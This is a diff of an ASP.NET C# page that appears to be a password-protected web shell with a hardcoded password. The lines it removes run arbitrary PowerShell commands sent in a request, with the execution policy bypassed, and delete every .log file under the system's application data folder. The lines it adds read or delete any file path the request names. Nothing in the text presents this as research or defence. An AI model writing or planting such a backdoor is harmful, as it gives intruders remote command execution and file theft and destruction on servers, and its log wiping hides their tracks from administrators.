@@ -25,18 +25,8 @@
                         <input type='submit' name='action' value='Read File' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
                         <input type='submit' name='action' value='Delete File' style='margin-left: 10px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #f00; color: #fff; font-size: 16px; cursor: pointer;' />
                     </form>
-                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
-                        <label for='powershellCommand' style='margin-right: 10px; font-weight: bold;'>PowerShell Command:</label>
-                        <input type='text' id='powershellCommand' name='powershell' style='flex: 1; padding: 10px; border: 1px solid #444; border-radius: 5px; background-color: #222; color: #0f0; font-size: 16px;' />
-                        <input type='hidden' name='password' value='28112016' />
-                        <input type='submit' value='Run PowerShell' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
-                    </form>
-                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
-                        <input type='hidden' name='password' value='28112016' />
-                        <input type='submit' name='action' value='Clear Logs' style='padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #f00; font-size: 16px; cursor: pointer;' />
-                    </form>
                 </div>
-                <div style='margin-top: 240px; padding: 20px;'>
+                <div style='margin-top: 160px; padding: 20px;'>
             ");
 
             if (!string.IsNullOrEmpty(lastCommand))
@@ -67,50 +57,46 @@
                 }
             }
 
-            if (Request["action"] == "Clear Logs")
+            if (!string.IsNullOrEmpty(filePathCommand))
             {
-                try
+                string action = Request["action"];
+                if (action == "Read File")
                 {
-                    // مسح السجلات من مجلد السجلات
-                    string[] logFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "*.log", SearchOption.AllDirectories);
-                    foreach (string logFile in logFiles)
+                    try
                     {
-                        File.Delete(logFile);
+                        if (File.Exists(filePathCommand))
+                        {
+                            string fileContent = File.ReadAllText(filePathCommand);
+                            Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(fileContent) + "</pre>");
+                        }
+                        else
+                        {
+                            Response.Write("<pre style='color: red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>File not found.</pre>");
+                        }
                     }
-                    Response.Write("<pre style='color: lime; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>Logs cleared successfully.</pre>");
-                }
-                catch (Exception ex)
-                {
-                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
-                }
-            }
-
-            if (!string.IsNullOrEmpty(Request["powershell"]))
-            {
-                try
-                {
-                    string psCommand = Request["powershell"];
-                    ProcessStartInfo psi = new ProcessStartInfo();
-                    psi.FileName = "powershell.exe";
-                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + psCommand;
-                    psi.RedirectStandardOutput = true;
-                    psi.RedirectStandardError = true;
-                    psi.UseShellExecute = false;
-                    psi.CreateNoWindow = true;
-
-                    Process process = Process.Start(psi);
-                    string output = process.StandardOutput.ReadToEnd();
-                    string error = process.StandardError.ReadToEnd();
-
-                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(output) + "</pre>");
-                    if (!string.IsNullOrEmpty(error))
+                    catch (Exception ex)
                     {
-                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(error) + "</pre>");
+                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                     }
                 }
-                catch (Exception ex)
+                else if (action == "Delete File")
                 {
-                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                    try
+                    {
+                        if (File.Exists(filePathCommand))
+                        {
+                            File.Delete(filePathCommand);
+                            Response.Write("<pre style='color: lime; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>File deleted successfully.</pre>");
+                        }
+                        else
+                        {
+                            Response.Write("<pre style='color: red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>File not found.</pre>");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                    }
                 }
             }
 
